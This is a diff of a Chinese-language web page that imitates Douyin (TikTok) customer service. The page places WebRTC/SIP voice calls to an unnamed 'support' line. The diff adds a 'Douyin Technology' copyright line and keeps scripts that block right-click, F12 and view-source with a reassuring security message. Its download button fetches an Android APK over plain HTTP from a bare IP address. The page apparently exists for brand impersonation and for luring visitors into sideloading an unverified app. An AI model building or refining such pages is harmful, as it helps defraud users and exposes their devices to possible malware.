@@ -2,10 +2,9 @@
 <html lang="zh-CN">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
   <title>网页呼叫客服 - 抖音风格</title>
   <style>
-    /* 你的样式不变 */
     body {
       margin: 0; padding: 0;
       background: linear-gradient(135deg, #f20000, #ff4141);
@@ -20,11 +19,12 @@
       width: 360px;
       max-width: 95vw;
       border-radius: 30px;
-      padding: 30px 20px;
+      padding: 30px 20px 60px; /* 为版权预留空间 */
       box-shadow: 0 15px 30px rgba(0,0,0,0.3);
       display: flex;
       flex-direction: column;
       align-items: center;
+      position: relative;
     }
     .avatar {
       width: 100px;
@@ -108,25 +108,35 @@
     audio {
       display: none;
     }
+    .copyright {
+      position: absolute;
+      bottom: 10px;
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+      width: 100%;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="avatar">
-      <img src="https://p1.music.126.net/yt2mMmAar7c_Lv6H8gnPXg==/109951166888490096.jpg" alt="客服头像" />
+      <img src="https://img.zcool.cn/community/01f87c5d04f5c2a801211d539479a2.jpg" alt="客服头像" />
     </div>
 
     <h1>欢迎来到在线客服中心</h1>
 
-    <button id="callButton">📞 呼叫客服</button>
-    <button id="hangupButton" disabled>🛑 挂断</button>
+    <button id="callButton" onclick="makeCall()">📞 呼叫客服</button>
+    <button id="hangupButton" onclick="hangupCall()" disabled>🛑 挂断</button>
     <button id="downloadApkButton">⬇️ 下载APP</button>
 
     <div id="callStatus">未呼叫</div>
     <audio id="audioRemote" autoplay></audio>
+
+    <div class="copyright">© 2025 Douyin Technology 版权所有</div>
   </div>
 
-  <!-- 必须的 JsSIP 和 adapter -->
+  <!-- JsSIP 和 adapter -->
   <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
 
@@ -162,24 +172,9 @@
         statusDisplay.textContent = text;
       }
 
-      // 防止右键菜单和F12
-      document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-      });
-      document.addEventListener('keydown', function(e) {
-        // 禁用F12和Ctrl+Shift+I/J/C以及Ctrl+U等查看源码快捷键
-        if (
-          e.key === 'F12' ||
-          (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
-          (e.ctrlKey && e.key.toUpperCase() === 'U')
-        ) {
-          e.preventDefault();
-          alert('操作被禁用');
-        }
-      });
-
-      callButton.addEventListener('click', function () {
+      window.makeCall = function () {
         if (isCalling) return;
+
         isCalling = true;
         callButton.disabled = true;
         hangupButton.disabled = false;
@@ -193,23 +188,11 @@
           }
         });
 
-        // 绑定远端音频流，兼容 track 和 addstream
-        function bindRemoteStream(stream) {
-          remoteAudio.srcObject = stream;
-          remoteAudio.play().catch(err => {
-            console.warn('自动播放失败:', err);
-            // iOS Safari 可能需要用户再次点击才能播放
-          });
-        }
-
         session.connection.addEventListener('track', function (event) {
           if(event.streams && event.streams[0]) {
-            bindRemoteStream(event.streams[0]);
+            remoteAudio.srcObject = event.streams[0];
+            remoteAudio.play().catch(err => console.warn('自动播放失败:', err));
           }
-        });
-        // 兼容老浏览器addstream事件
-        session.connection.addEventListener('addstream', function(event) {
-          bindRemoteStream(event.stream);
         });
 
         session.on('progress', () => updateStatus("振铃中..."));
@@ -223,29 +206,21 @@
           console.error('呼叫失败:', e);
           resetUI();
         });
-        session.on('confirmed', () => {
-          // 通话确认后尝试播放音频（防止自动播放阻止）
-          remoteAudio.play().catch(() => {
-            console.log('请手动点击播放音频');
-          });
-        });
-      });
+      };
 
-      hangupButton.addEventListener('click', function () {
+      window.hangupCall = function () {
         if (session) {
           session.terminate();
         }
-      });
+      };
 
       function resetUI() {
         isCalling = false;
         callButton.disabled = false;
         hangupButton.disabled = true;
         session = null;
-        remoteAudio.srcObject = null;
       }
 
-      // 下载 APK
       const downloadApkButton = document.getElementById('downloadApkButton');
       downloadApkButton.addEventListener('click', () => {
         const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk';
@@ -256,7 +231,19 @@
         a.click();
         document.body.removeChild(a);
       });
+    });
 
+    // 禁用右键和常见调试快捷键
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (
+        e.key === 'F12' || 
+        (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || 
+        (e.ctrlKey && e.key === 'U')
+      ) {
+        e.preventDefault();
+        alert('为了您的安全，调试功能已禁用。');
+      }
     });
   </script>
 </body>
